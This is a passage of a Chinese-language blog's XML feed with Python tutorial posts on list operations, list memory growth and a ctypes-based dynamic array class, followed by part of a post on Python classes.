src="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014854018.png" class="lazyload" data-srcset="/2020/09/20/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Android-Studio%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83/image-20200920014854018.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200920014854018"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的动态数组</title>
      <link href="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/"/>
      <url>/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="1-python的序列类型本质"><a href="#1-python的序列类型本质" class="headerlink" title="1.python的序列类型本质"></a>1.python的序列类型本质</h1><p>内置的三大常用数据结构——列表类（list）、元组类（tuple）和字符串类（str）</p><p>类都有一个很明显的共性，都可以用来保存多个数据元素，最主要的功能是：每个类都支持下标（索引）访问该序列的元素，比如使用语法 <code>Seq[i]</code>。其实上面每个类都是使用 <code>数组</code> 这种简单的数据结构表示。</p><h1 id="2-python的列表"><a href="#2-python的列表" class="headerlink" title="2.python的列表"></a>2.python的列表</h1><p>实例操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">test_list = []<span class="comment"># 创建名为test_list的空列表</span></span><br><span class="line"><span class="comment">#在列表后添加元素</span></span><br><span class="line">test_list.append(<span class="string">&quot;Hello&quot;</span>)</span><br><span class="line">test_list.append(<span class="string">&quot;World&quot;</span>)</span><br><span class="line">test_list=[<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>]<span class="comment">#重新对数组进行赋值</span></span><br><span class="line">test_list=[<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;Array&quot;</span>, <span class="number">2019</span>, <span class="string">&quot;easy learning&quot;</span>, <span class="string">&quot;DataStructure&quot;</span>]<span class="comment"># 重新给test_list赋值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数组的长度：&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(test_list)))<span class="comment"># 求列表的长度</span></span><br><span class="line">test_list[<span class="number">2</span>] = <span class="number">1024</span><span class="comment"># 修改列表元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;改变数组元素:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line">test_list.insert(<span class="number">1</span>, <span class="string">&quot;I love&quot;</span>)<span class="comment"># 向列表中指定位置中插入一个元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;列表中指定位置中插入一个元素:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line">test_list.append(<span class="number">2020</span>)<span class="comment"># 向列表末尾增加一个元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;向列表末尾增加一个元素:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line"><span class="built_in">print</span>(test_list.pop(<span class="number">1</span>))<span class="comment"># 删除指定位置的元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除指定位置的元素:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line">test_list.remove(<span class="number">2020</span>)<span class="comment"># 删除指定元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;删除指定元素2020:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;查找某个元素的索引值:&quot;</span>+<span class="built_in">str</span>(test_list.index(<span class="string">&#x27;Hello&#x27;</span>)))<span class="comment"># 查找某个元素的索引值</span></span><br><span class="line"><span class="comment">#test_list.index(&#x27;hello&#x27;)# 如果查找某个元素不在列表中，返回ValueError错误</span></span><br><span class="line">test_list.reverse()<span class="comment"># 反转整个列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;反转整个列表:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line">test_list.clear()<span class="comment"># 清空列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; 清空列表:&quot;</span>+<span class="built_in">str</span>(test_list))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果："><a href="#运行结果：" class="headerlink" title="运行结果："></a>运行结果：</h5><p><img src="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912113224210.png" class="lazyload" data-srcset="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912113224210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200912113224210"></p><h1 id="3-Python列表的内存分配"><a href="#3-Python列表的内存分配" class="headerlink" title="3.Python列表的内存分配"></a>3.Python列表的内存分配</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入sys模块能方便我们使用gestsizeof函数</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># set n</span></span><br><span class="line">n = <span class="number">20</span></span><br><span class="line"><span class="comment"># set empty list</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    a = <span class="built_in">len</span>(<span class="built_in">list</span>)</span><br><span class="line">    <span class="comment"># 调用getsizeof函数用于给出Python中存储对象的真实字节数</span></span><br><span class="line">    b = sys.getsizeof(<span class="built_in">list</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Length:&#123;0:3d&#125;; Size of bytes:&#123;1:4d&#125;&#x27;</span>.<span class="built_in">format</span>(a, b))</span><br><span class="line">    <span class="comment"># Increase length by one</span></span><br><span class="line">    <span class="built_in">list</span>.append(n)</span><br></pre></td></tr></table></figure><h5 id="运行结果：-1"><a href="#运行结果：-1" class="headerlink" title="运行结果："></a>运行结果：</h5><p><img src="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912114829872.png" class="lazyload" data-srcset="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912114829872.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200912114829872"></p><p>从<code>Length：1</code>为56，<code>Length：2</code>为88，直到<code>Length：4</code>为88</p><blockquote><p>88-56=32=4*8  <strong>64位机器为8字节一个整数</strong></p></blockquote><h1 id="4-动态数组"><a href="#4-动态数组" class="headerlink" title="4.动态数组"></a>4.动态数组</h1><p>动态数组是内存的连续区域，其大小随着插入新数据而动态增长。在静态数组中，我们需要在分配时指定大小。在定义数组的时候，其实计算机已经帮我们分配好了内存来存储，实际上我们不能扩展数组，因为它的大小是固定的。比如：我们分配一个大小为10的数组，则不能插入超过10个项目。</p><p>但是动态数组会在需要的时候自动调整其大小。这一点有点像我们使用的Python列表，可以存储任意数量的项目，而无需在分配时指定大小。</p><p>实现一个动态数组的实现的关键是——如何扩展数组？当列表<strong>list1</strong>的大小已满时，而此时有新的元素要添加进列表，我们会执行一下步骤来克服其大小限制的缺点：</p><ol><li>分配具有更大容量的新数组 <strong>list2</strong></li><li>设置 <strong>list2[i] = list1[i]</strong> (i=0,1,2,…，n-1)，其中n是该项目的当前编号</li><li>设置<strong>list1 = list2</strong>，也就是说，list2正在作为新的数组来引用我们的新列表。</li><li>然后，只要将新的元素插入（添加）到我们的列表list1即可。</li></ol><h5 id="实现动态数组的Python代码"><a href="#实现动态数组的Python代码" class="headerlink" title="实现动态数组的Python代码"></a>实现动态数组的Python代码</h5><p>在Python中，我们利用ctypes的内置库来创建自己的动态数组类，因为<a href="https://docs.python.org/zh-cn/3/library/ctypes.html?highlight=ctype#module-ctypes">ctypes模块</a>提供对原始数组的支持，为了更快的对数组进行学习，所以对ctypes的知识可以查看官方文档进行学习。关于Python的公有方法与私有方法，我们在方法名称前使用双下划线**__**使其保持隐藏状态。</p><p>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicArray</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A dynamic array class akin to a simplified Python list.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Create an empty array.&quot;&quot;&quot;</span></span><br><span class="line">        self.n = <span class="number">0</span>             <span class="comment"># count actual elements</span></span><br><span class="line">        self.capacity = <span class="number">1</span>      <span class="comment"># default array capacity</span></span><br><span class="line">        self.A = self._make_array(self.capacity)      <span class="comment"># low-level array</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">is_empty</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot; Return True if array is empty&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.n == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return numbers of elements stored in the array.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.n</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span>(<span class="params">self, i</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return element at index i.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">0</span> &lt;= i &lt; self.n:</span><br><span class="line">            <span class="comment"># Check it i index is in bounds of array</span></span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid index&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.A[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">append</span>(<span class="params">self, obj</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Add object to end of the array.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.n == self.capacity:</span><br><span class="line">            <span class="comment"># Double capacity if not enough room</span></span><br><span class="line">            self._resize(<span class="number">2</span> * self.capacity)</span><br><span class="line">        self.A[self.n] = obj    <span class="comment"># Set self.n index to obj</span></span><br><span class="line">        self.n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_resize</span>(<span class="params">self, c</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Resize internal array to capacity c.&quot;&quot;&quot;</span></span><br><span class="line">        B = self._make_array(c)     <span class="comment"># New bigger array</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.n):    <span class="comment"># Reference all existing values</span></span><br><span class="line">            B[k] = self.A[k]</span><br><span class="line">        self.A = B          <span class="comment"># Call A the new bigger array</span></span><br><span class="line">        self.capacity = c   <span class="comment"># Reset the capacity</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_make_array</span>(<span class="params">c</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Return new array with capacity c.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (c * ctypes.py_object)()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span>(<span class="params">self, k, value</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Insert value at position k.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.n == self.capacity:</span><br><span class="line">            self._resize(<span class="number">2</span> * self.capacity)</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(self.n, k, -<span class="number">1</span>):</span><br><span class="line">            self.A[j] = self.A[j-<span class="number">1</span>]</span><br><span class="line">        self.A[k] = value</span><br><span class="line">        self.n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span>(<span class="params">self, index=<span class="number">0</span></span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Remove item at index (default first).&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> index &gt;= self.n <span class="keyword">or</span> index &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;invalid index&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(index, self.n-<span class="number">1</span>):</span><br><span class="line">            self.A[i] = self.A[i+<span class="number">1</span>]</span><br><span class="line">        self.A[self.n - <span class="number">1</span>] = <span class="literal">None</span></span><br><span class="line">        self.n -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">remove</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Remove the first occurrence of a value in the array.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            <span class="keyword">if</span> self.A[k] == value:</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k, self.n - <span class="number">1</span>):</span><br><span class="line">                    self.A[j] = self.A[j+<span class="number">1</span>]</span><br><span class="line">                self.A[self.n - <span class="number">1</span>] = <span class="literal">None</span></span><br><span class="line">                self.n -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&#x27;value not found&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_print</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Print the array.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            <span class="built_in">print</span>(self.A[i], end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># Instantiate</span></span><br><span class="line">    mylist = DynamicArray()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Append new element</span></span><br><span class="line">    mylist.append(<span class="number">10</span>)</span><br><span class="line">    mylist.append(<span class="number">9</span>)</span><br><span class="line">    mylist.append(<span class="number">8</span>)</span><br><span class="line">    <span class="comment"># Insert new element in given position</span></span><br><span class="line">    mylist.insert(<span class="number">1</span>, <span class="number">1024</span>)</span><br><span class="line">    mylist.insert(<span class="number">2</span>, <span class="number">2019</span>)</span><br><span class="line">    <span class="comment"># Check length</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The array length is: &#x27;</span>, mylist.__len__())</span><br><span class="line">    <span class="comment"># Print the array</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Print the array：&#x27;</span>)</span><br><span class="line">    mylist._<span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># Index</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;The element at index 1 is :&#x27;</span>, mylist[<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># Remove element</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Remove 2019 in array:&#x27;</span>)</span><br><span class="line">    mylist.remove(<span class="number">2019</span>)</span><br><span class="line">    mylist._<span class="built_in">print</span>()</span><br><span class="line">    <span class="comment"># Pop element in given position</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Pop pos 2 in array:&#x27;</span>)</span><br><span class="line">    <span class="comment"># mylist.pop()</span></span><br><span class="line">    mylist.pop(<span class="number">2</span>)</span><br><span class="line">    mylist._<span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="运行结果：-2"><a href="#运行结果：-2" class="headerlink" title="运行结果："></a>运行结果：</h5><p><img src="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912120050325.png" class="lazyload" data-srcset="/2020/09/12/Python/Python%E7%9A%84%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84/image-20200912120050325.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200912120050325"></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的类</title>
      <link href="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/"/>
      <url>/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<p>链接：<a href>https://www.runoob.com/python/python-object.html</a></p><h1 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h1><ul><li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><strong>数据成员：</strong>类变量或者实例变量, 用于处理类及其实例对象的相关的数据。</li><li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li><li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li><li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的。这种变量就称为实例变量，是在类声明的内部但是在类的其他成员方法之外声明的。</li><li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。</li><li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li><li><strong>方法：</strong>类中定义的函数。</li><li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li></ul><h1 id="2-基本形式"><a href="#2-基本形式" class="headerlink" title="2.基本形式"></a>2.基本形式</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ClassName</span>:</span></span><br><span class="line">    <span class="string">&#x27;提示信息&#x27;</span></span><br><span class="line">    class_suite <span class="comment">#类体</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">animals</span>:</span></span><br><span class="line">    <span class="string">&#x27;动物类&#x27;</span></span><br><span class="line">    ani_Count = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, cat, dog</span>):</span></span><br><span class="line">        self.cat = cat</span><br><span class="line">        self.dog = dog</span><br><span class="line">        animals.ani_Count+=<span class="number">1</span> <span class="comment">#一个类中的变量 在所有类中共享</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">displayCount</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Total animals cat and dog %d&quot;</span> %animals.ani_Count)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">disanimals_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Cat: &quot;</span>, self.cat, <span class="string">&quot;, Dog: &quot;</span>, self.dog)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">home=animals(<span class="string">&quot;kitty&quot;</span>,<span class="string">&quot;amy&quot;</span>)</span><br><span class="line">zoo=animals(<span class="string">&quot;kitty&quot;</span>,<span class="string">&quot;amy&quot;</span>)</span><br><span class="line">home.disanimals_name()</span><br><span class="line">zoo.disanimals_name()</span><br><span class="line">home.displayCount()</span><br></pre></td></tr></table></figure><p><strong>ani_Count是一个类中的变量，应该是类似在C中类中声明的静态变量，各个对象去共享通过变量</strong></p><p><strong>init_为该类的构造函数，第一个变量应都为self该对象本身，self 代表类的实例，self 在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数</strong></p><p><strong>声明对象为 对象名=类名(构造变量）</strong></p><p><strong>运行截图</strong>：<img src="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910173303197.png" class="lazyload" data-srcset="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910173303197.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200910173303197"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加类中的属性</span></span><br><span class="line">home.bird=<span class="string">&quot;titi&quot;</span></span><br><span class="line"><span class="built_in">print</span>(home.bird)</span><br><span class="line"><span class="comment">#修改类中的属性</span></span><br><span class="line">home.bird=<span class="string">&quot;qiqi&quot;</span></span><br><span class="line"><span class="built_in">print</span>(home.bird)</span><br><span class="line"><span class="comment">#删除类中的属性</span></span><br><span class="line"><span class="keyword">del</span> home.bird</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hasattr</span>(home, <span class="string">&#x27;bird&#x27;</span>))    <span class="comment"># 如果存在 &#x27;bird&#x27; 属性返回 True，否则返回Fasle。</span></span><br></pre></td></tr></table></figure><p><strong>运行截图</strong>：<img src="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910174542313.png" class="lazyload" data-srcset="/2020/09/10/Python/Python%E7%9A%84%E7%B1%BB/image-20200910174542313.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200910174542313"></p><h1 id="3-Python内置类属性"><a href="#3-Python内置类属性" class="headerlink" title="3.Python内置类属性"></a>3.Python内置类属性</h1><ul><li><strong>dict</strong> : 类的属性（包含一个字典，由类的数据属性组成）</li><li><strong>doc</strong> :类的文档字符串</li><li><strong>name</strong>: 类名</li><li><strong>module</strong>: 类定义所在的模块（类的全名是’<strong>main</strong>.className’，如果类位于一个导入模块mymod中，那么className.<strong>module</strong> 等于 mymod）</li><li><strong>bases</strong> : 类的所有父类构成元素（包含了一个由所有父类组成的元组）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 